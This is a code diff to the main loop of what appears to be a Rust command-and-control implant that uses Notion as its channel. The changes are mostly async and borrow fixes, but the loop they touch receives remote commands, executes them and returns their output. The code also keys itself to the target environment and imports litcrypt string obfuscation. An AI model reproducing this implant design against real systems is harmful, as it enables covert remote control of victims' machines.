@@ -4,6 +4,8 @@ extern crate tokio;
 extern crate serde_json;
 extern crate whoami;
 extern crate base64;
+
+#[macro_use]
 extern crate litcrypt;
 
 use std::{thread, time};
@@ -70,9 +72,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // TODO: Initialize Channel
 
-    let logger = logger::Logger::new(config_options.log_level);
+    let logger = logger::Logger::new(config_options.log_level.clone());
 
-    let channel = match config_options.channel_type {
+    let channel_type = config_options.channel_type.clone();
+
+    let mut channel = match channel_type {
         ChannelType::Notion(nc) => nc,
         ChannelType::Unknown => {
             panic!("Unknown channel type!");
@@ -108,7 +112,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Before anything else happens, we key to the env if the config has been set.
     // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
-    if env_check::check_env_keys(&config_options).await {
+    if env_check::check_env_keys(&config_options.env_checks).await {
         logger.info(log_out!("Keys match; continuing..."))
     } else {
         logger.crit(log_out!("Env check failure. Shutting down..."));
@@ -142,10 +146,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let commands: Vec<AgentCommand>  = channel.receive().await.unwrap();
 
-        for c in commands {
+        for mut c in commands {
             let output: String = c.handle(&mut config_options, &logger).await?;
-            channel.complete(c);
-            channel.send(output, &c.rel);
+            channel.complete(c.clone()).await;
+            channel.send(output, &c.rel).await;
             match c.command_type {
                 CommandType::Shutdown => {exit(0);},
                 CommandType::Selfdestruct => {exit(0)},
